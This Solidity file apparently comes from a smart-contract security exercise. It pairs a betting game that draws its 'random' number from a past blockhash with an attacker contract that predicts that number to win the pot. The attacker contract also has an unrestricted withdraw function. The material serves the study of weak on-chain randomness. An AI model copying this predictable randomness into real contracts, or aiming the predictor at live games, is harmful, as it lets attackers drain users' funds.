// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract HowRandomIsRandom {
  Game[] public games;

  struct Game {
      address player;
      uint id;
      uint bet;
      uint blockNumber;
  }

  event LogGameCreated(uint gameId, address player, uint bet, uint blockNumber);
  event LogRandomGenerated(uint lastGameId, uint randomNumber, uint lastBet, address winner);
  event BetPlaced(uint randomNumber, uint bet);
  event EtherPaid(uint256 balance);

  function spin(uint256 _bet) public payable {
    require(msg.value >= 0.01 ether, "Insufficient bet");
    uint gameId = games.length;
    games.push(Game(msg.sender, gameId, _bet, block.number - 1));

    emit LogGameCreated(gameId, msg.sender, _bet, block.number - 1);

    if (gameId > 0) {
      uint lastGameId = gameId - 1;
      uint num = rand(blockhash(games[lastGameId].blockNumber), 100);

      emit LogRandomGenerated(lastGameId, num, games[lastGameId].bet, games[lastGameId].player);

      emit BetPlaced(num, _bet);
      if(num == games[gameId].bet) {
          payable(games[lastGameId].player).transfer(address(this).balance);
          emit EtherPaid(address(this).balance);
      }
    }
  }

  function rand(bytes32 hashValue, uint max) pure private returns (uint256 result) {
    return uint256(keccak256(abi.encodePacked(hashValue))) % max;
  }

  receive() external payable {}
}

contract AttackHowRandomIsRandom {
    HowRandomIsRandom public target;

    event LastBlockHashNumber(uint256 blockHash);
    event LogPredictedNumber(uint256 predictedNumber);

    constructor(address payable _targetAddress) payable {
        target = HowRandomIsRandom(_targetAddress);
    }

    function firstSpin() public payable {
        require(msg.value >= 0.01 ether, "Need at least 0.01 ether to start");

        // First spin to push a game onto the list
        target.spin{value: 0.01 ether}(0);  // The bet value doesn't matter here
    }

    function secondSpin() public payable {
        require(msg.value >= 0.01 ether, "Need at least 0.01 ether for the second spin");

        // Predict the random number using the last block's blockhash
        uint256 lastBlockHashNumber = uint256(blockhash(block.number - 1));
        uint256 predictedRandomNumber = uint256(keccak256(abi.encodePacked(lastBlockHashNumber))) % 100;

        // Log the predicted number for verification
        emit LastBlockHashNumber(lastBlockHashNumber);
        emit LogPredictedNumber(predictedRandomNumber);

        // Second spin with the correct predicted number
        target.spin{value: 0.01 ether}(predictedRandomNumber);
    }

    // Function to withdraw any funds received
    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    // Allow the contract to receive Ether
    receive() external payable {}
}



